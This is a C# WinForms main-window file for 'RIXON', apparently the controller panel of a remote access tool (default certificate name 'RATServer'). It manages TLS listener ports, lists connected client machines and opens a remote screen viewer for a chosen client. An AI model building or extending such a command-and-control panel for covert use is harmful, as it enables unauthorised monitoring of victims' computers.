using System.Collections.Concurrent;
using System.Diagnostics;
using System.Security.Cryptography.X509Certificates;
using RIXON.Crypto;
using RIXON.Forms;
using RIXON.Managers;
using RIXON.Network;

namespace RIXON;

public sealed partial class MainForm : Form
{
    private static readonly string DefaultCertPath =
        Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "server.pfx");

    private readonly ListenerManager _listenerMgr = new();
    private readonly ClientManager _clientMgr = new();
    private readonly LogManager _logMgr = new();
    private readonly ConcurrentDictionary<Guid, ClientSession> _sessions = new();

    private X509Certificate2? _cert;

    public MainForm()
    {
        InitializeComponent();
        WireEvents();
        InitCert();
    }

    // ── wiring ───────────────────────────────────────────────────────────

    private void WireEvents()
    {
        _clientMgr.Attach(_clientsView);
        _logMgr.Attach(_logsView);
        _listenerMgr.ClientConnected += OnClientConnected;
        _addPortBtn.Click += AddPort_Click;
        _removePortBtn.Click += RemovePort_Click;
        _genCertBtn.Click += GenCert_Click;
        _clientMenu.Opening += ClientMenu_Opening;
        _screenMenuItem.Click += ScreenMenuItem_Click;
        FormClosed += (_, _) => _listenerMgr.Dispose();
    }

    // ── certificate ───────────────────────────────────────────────────────

    private void InitCert()
    {
        var cert = CertManager.LoadDefault(DefaultCertPath);
        if (cert != null)
        {
            string existingCn = cert.GetNameInfo(X509NameType.SimpleName, forIssuer: false);
            _keyTextBox.Text = existingCn;
            ApplyCert(cert);
            return;
        }

        string cn = _keyTextBox.Text.Trim();
        if (string.IsNullOrEmpty(cn)) cn = "RATServer";
        cert = CertManager.GenerateSelfSigned(cn);
        CertManager.SaveDefault(cert, DefaultCertPath);
        ApplyCert(cert);
        _logMgr.Log($"Certificate created  [Key: {cn}]");
    }

    private void ApplyCert(X509Certificate2 cert)
    {
        _cert?.Dispose();
        _cert = cert;
        _listenerMgr.SetCertificate(cert);

        string cn = cert.GetNameInfo(X509NameType.SimpleName, forIssuer: false);
        _certThumbLabel.ForeColor = SystemColors.ControlText;
        _certThumbLabel.Text = $"TLS 1.2  ●  Key: {cn}";
        _logMgr.Log($"TLS active  [Key: {cn}]");
    }

    private void GenCert_Click(object? sender, EventArgs e)
    {
        string cn = _keyTextBox.Text.Trim();
        if (string.IsNullOrEmpty(cn))
        {
            MessageBox.Show("TLS Key cannot be empty.", "Invalid Key",
                MessageBoxButtons.OK, MessageBoxIcon.Warning);
            return;
        }

        var r = MessageBox.Show(
            $"Apply TLS Key \"{cn}\"?\n" +
            "A new certificate will be generated. Update EXPECTED_CN in client config.h.",
            "Apply Key", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
        if (r != DialogResult.Yes) return;

        var cert = CertManager.GenerateSelfSigned(cn);
        CertManager.SaveDefault(cert, DefaultCertPath);
        ApplyCert(cert);
        _logMgr.Log($"Key applied: \"{cn}\"  —  update client EXPECTED_CN");
    }

    // ── client events ─────────────────────────────────────────────────────

    private void OnClientConnected(object? sender, ClientSession session)
    {
        session.HelloReceived += (_, hello) =>
        {
            _sessions[session.Info.Id] = session;
            _clientMgr.AddClient(session.Info);
            _logMgr.Log($"Connected  ▸  {session.Info.Ip}  [{hello.Hostname}]  {hello.Os}");
            RefreshStatus();
        };

        session.UpdateReceived += (_, aw) =>
        {
            _clientMgr.UpdateClient(session.Info.Id, aw);
        };

        session.Disconnected += (_, _) =>
        {
            _sessions.TryRemove(session.Info.Id, out _);
            _clientMgr.RemoveClient(session.Info.Id);
            _logMgr.Log($"Disconnected  ▸  {session.Info.Ip}  [{session.Info.Hostname}]");
            RefreshStatus();
        };
    }

    // ── context menu ──────────────────────────────────────────────────────

    private void ClientMenu_Opening(object? sender, System.ComponentModel.CancelEventArgs e)
    {
        e.Cancel = _clientsView.SelectedItems.Count == 0;
    }

    private void ScreenMenuItem_Click(object? sender, EventArgs e)
    {
        if (_clientsView.SelectedItems.Count == 0) return;
        var item = _clientsView.SelectedItems[0];
        if (item.Tag is not Guid id) return;
        if (!_sessions.TryGetValue(id, out var session)) return;

        var viewer = new ScreenViewer(session);
        viewer.Show(this);
    }

    // ── port buttons ─────────────────────────────────────────────────────

    private void AddPort_Click(object? sender, EventArgs e)
    {
        using var dlg = new AddPortDialog();
        if (dlg.ShowDialog(this) != DialogResult.OK) return;

        int port = dlg.Port;

        if (_cert == null)
        {
            var r = MessageBox.Show(
                $"No certificate loaded. Port {port} will accept unencrypted connections.\nContinue?",
                "No TLS Certificate",
                MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (r != DialogResult.Yes) return;
        }

        if (_listenerMgr.AddPort(port))
        {
            var item = new ListViewItem(port.ToString());
            item.SubItems.Add(_cert != null ? "Listening (TLS 1.2)" : "Listening (no TLS)");
            _listeningView.Items.Add(item);
            _logMgr.Log($"Listener started on port {port}");
            RefreshStatus();
        }
        else
        {
            MessageBox.Show(
                $"Cannot bind port {port}.\nIt may already be in use or requires elevation.",
                "Port Error",
                MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }
    }

    private void RemovePort_Click(object? sender, EventArgs e)
    {
        if (_listeningView.SelectedItems.Count == 0) return;

        var item = _listeningView.SelectedItems[0];
        if (!int.TryParse(item.Text, out int port)) return;

        _listenerMgr.RemovePort(port);
        _listeningView.Items.Remove(item);
        _logMgr.Log($"Listener stopped on port {port}");
        RefreshStatus();
    }

    // ── status bar ───────────────────────────────────────────────────────

    private void RefreshStatus()
    {
        if (IsDisposed) return;
        try
        {
            Action update = () =>
            {
                int count = _clientMgr.Count;
                Text = count > 0 ? $"RIXON  —  Connected: {count}" : "RIXON";
                _statusLabel.Text = $"Clients: {count}  |  Ports: {_listeningView.Items.Count}";
            };

            if (InvokeRequired) Invoke(update);
            else update();
        }
        catch (ObjectDisposedException) { }
    }

    private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
    {
        Process.Start(new ProcessStartInfo
        {
            FileName = "https://github.com/jungsuxx",
            UseShellExecute = true
        });
    }
}
